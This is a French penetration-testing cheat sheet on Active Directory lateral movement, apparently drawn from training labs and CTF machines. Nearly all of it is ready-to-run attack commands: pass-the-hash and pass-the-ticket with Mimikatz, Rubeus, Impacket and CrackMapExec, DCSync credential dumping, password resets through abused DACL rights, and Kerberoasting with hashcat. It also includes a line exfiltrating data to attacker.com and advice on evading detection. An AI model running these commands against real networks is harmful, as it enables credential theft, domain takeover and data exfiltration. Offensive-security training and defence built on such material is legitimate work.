# Mouvement Latéral

## Techniques de Mouvement Latéral avec WMI/DCOM

### WMI (Windows Management Instrumentation)

```powershell
# Créer un objet d'identifiants
$username = 'inlanefreight\user'
$password = 'Password123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

# Exécuter une commande via WMI
$Command = "powershell.exe -enc BASE64_ENCODED_COMMAND"
Invoke-WmiMethod -ComputerName target.inlanefreight.local -Class Win32_Process -Name Create -ArgumentList $Command -Credential $credential
```
### DCOM (Distributed COM)
```powershell
# Utiliser DCOM pour l'exécution à distance
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName target.inlanefreight.local -Credential $credential -SessionOption $Options 
$command = 'powershell.exe -enc BASE64_ENCODED_COMMAND'
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command}
```
## Techniques utilisant WinRM
### PowerShell Remoting (WinRM)

```powershell
# Établir une session PowerShell à distance
Enter-PSSession -ComputerName target.inlanefreight.local -Credential $credential

# Exécuter une commande sur un système distant
Invoke-Command -ComputerName target.inlanefreight.local -Credential $credential -ScriptBlock {whoami; hostname}
```
### WinRM depuis Linux

```bash
# Utiliser Evil-WinRM
evil-winrm -i target.inlanefreight.local -u username -p 'Password123!'

# Avec un hash NTLM (Pass-the-Hash)
evil-winrm -i target.inlanefreight.local -u username -H 'NTLM_HASH'
```
## Problème du "Double Hop" Kerberos
Le problème de "Double Hop" se produit lorsque vous êtes authentifié sur une machine A via Kerberos et que vous tentez d'accéder à une machine B depuis cette machine A.
### Solution 1: Utiliser un objet PSCredential
```powershell
# Sur la session WinRM
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\username', $SecPassword)

# Utiliser les identifiants pour chaque commande nécessitant un accès réseau
Get-DomainUser -Credential $Cred
```
### Solution 2: Configuration de session PSRemoting
```powershell
# Enregistrer une configuration de session qui utilise les identifiants
Register-PSSessionConfiguration -Name SessionWithCreds -RunAsCredential inlanefreight\username
Restart-Service WinRM

# Se connecter en utilisant cette configuration
Enter-PSSession -ComputerName target.inlanefreight.local -ConfigurationName SessionWithCreds
```
## Pass-the-Hash
### Avec CrackMapExec

```bash
# Exécution de commande avec un hash NTLM
crackmapexec smb target.inlanefreight.local -u username -H NTLM_HASH -x "whoami"

# Vérifier l'accès PowerShell Remoting
crackmapexec winrm target.inlanefreight.local -u username -H NTLM_HASH
```
### Avec Impacket
```bash
# PsExec avec Pass-the-Hash
impacket-psexec -hashes :NTLM_HASH inlanefreight.local/username@target.inlanefreight.local

# WMI avec Pass-the-Hash
impacket-wmiexec -hashes :NTLM_HASH inlanefreight.local/username@target.inlanefreight.local
```
## Pass-the-Ticket
### Avec Mimikatz

```powershell
# Exporter des tickets depuis la mémoire
kerberos::list
kerberos::list /export

# Injecter un ticket dans la session
kerberos::ptt ticket.kirbi
```
### Avec Rubeus
```powershell
# Exporter un ticket
.\Rubeus.exe dump /service:krbtgt

# Injecter un ticket
.\Rubeus.exe ptt /ticket:ticket.kirbi
```
## Overpass-the-Hash (génération de ticket Kerberos)
### Avec Rubeus
```powershell
# Convertir un hash NTLM en ticket Kerberos
.\Rubeus.exe asktgt /domain:inlanefreight.local /user:username /rc4:NTLM_HASH /ptt
```
### Avec Mimikatz
```powershell
# Utiliser sekurlsa::pth pour créer une nouvelle session avec le hash
sekurlsa::pth /user:username /domain:inlanefreight.local /ntlm:NTLM_HASH /run:powershell.exe
```
## Utilisation des identifiants extraits
### DCSync pour extraire des credentials
```powershell
# Avec Mimikatz
lsadump::dcsync /domain:inlanefreight.local /user:Administrator

# Avec Impacket
secretsdump.py -just-dc inlanefreight.local/username:password@dc.inlanefreight.local
```
### Recherche de comptes de services et d'administrateurs locaux
```powershell
# Trouver sur quels postes l'utilisateur a des droits d'admin local
Find-LocalAdminAccess -Verbose

# Cibler les administrateurs locaux
Invoke-UserHunter -CheckAccess
```
## Techniques pour échapper aux contrôles de sécurité
### Contournement via LAPS

```powershell
# Lire le mot de passe LAPS avec les droits appropriés
Get-DomainComputer -Identity target -Properties ms-Mcs-AdmPwd | select name,"ms-Mcs-AdmPwd"
```
### Utilisation de communications chiffrées
```powershell
# Établir un tunnel HTTPS pour l'exfiltration
Invoke-WebRequest -Uri "https://attacker.com/$env:COMPUTERNAME.txt" -Method POST -Body $result
```
## Points Clés

- Documenter tous les mouvements latéraux réussis
- Privilégier les méthodes silencieuses pour éviter la détection
- Comprendre les limitations du Double Hop pour les projets réels
- Mixer différentes techniques pour contourner les barrières de sécurité
- Être conscient des logs générés par les différentes méthodes
## Techniques de mouvement latéral tirées de CTFs réels

#### Abus des droits DACL (WriteOwner, GenericAll, GenericWrite) (Administrator)
Lorsqu'un utilisateur a des droits spécifiques sur d'autres objets AD:
#### Exploitation de WriteOwner
```bash
# Avec bloodyAD
bloodyAD -u "utilisateur" -p "motdepasse" -d "domaine" --host "IP" add owner --target "Groupe" --owner "Utilisateur"
```
#### Exploitation de GenericAll
```bash
# Avec PowerView
Set-DomainUserPassword -Identity "utilisateur_cible" -Password (ConvertTo-SecureString "nouveau_mot_de_passe" -AsPlainText -Force)

# Avec bloodyAD
bloodyAD -u "utilisateur" -p "motdepasse" -d "domaine" --host "IP" set password --target "utilisateur_cible" --new-password "nouveau_mot_de_passe"
```
#### Exploitation de GenericWrite pour Kerberoasting
```bash
# Création d'un SPN via targetedKerberoast.py
python targetedKerberoast.py -u "utilisateur" -p "motdepasse" -d "domaine" --dc-ip IP

# Cracker le hash obtenu
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
> ⚠️ N'oubliez pas de synchroniser l'heure avec le contrôleur de domaine avant d'exécuter des attaques Kerberos:
```bash
bash> sudo ntpdate -u <IP du DC>
```
### Énumération et visualisation avec BloodHound (Administrator, Certified)
#### BloodHound est essentiel pour identifier les chemins d'attaque:
```bash
# Collecte de données avec BloodHound Python
bloodhound-python -u utilisateur -p 'password' -c All -d domaine.tld -ns 10.10.10.x
```
Après importation dans BloodHound, marquez les utilisateurs compromis comme "Owned" et recherchez:
- Shortest Paths to High Value Targets
- Objets avec contrôles délégués (GenericAll, WriteOwner, etc.)

